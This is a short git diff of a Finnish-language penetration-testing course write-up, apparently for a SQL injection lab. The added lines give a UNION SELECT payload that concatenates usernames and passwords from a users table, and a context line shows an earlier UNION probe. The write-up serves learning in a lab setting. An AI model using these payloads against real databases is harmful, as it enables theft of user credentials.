@@ -224,7 +224,8 @@ Sama tarkastus alkuun. ```'+UNION+SELECT+NULL,'abc'--```
 
 ![image](https://github.com/LassiMik/Tunkeutumistestaus_ict4tn027-3012/assets/112076377/552358bc-1a31-49a8-8450-74083586dbb2)
 
-Tälläkertaa tietokanta palauttaa vain yhden kolumnin tietoa.
+Tälläkertaa tietokanta palauttaa vain yhden kolumnin tietoa. Mutta miten saan ahdettua sekä käyttäjän nimen sekä salasanan yhteen tauluun? Katsoin apua solutions kohdasta. 
+```'+UNION+SELECT+NULL,username||'~'||password+FROM+users--``` on oikea komento. Eli kaksi kolumnia liitetään yhteet "putkilla".
 
 ![image](https://github.com/LassiMik/Tunkeutumistestaus_ict4tn027-3012/assets/112076377/c0904e5c-70f5-43cf-a5af-7a2a682f02e1)
 
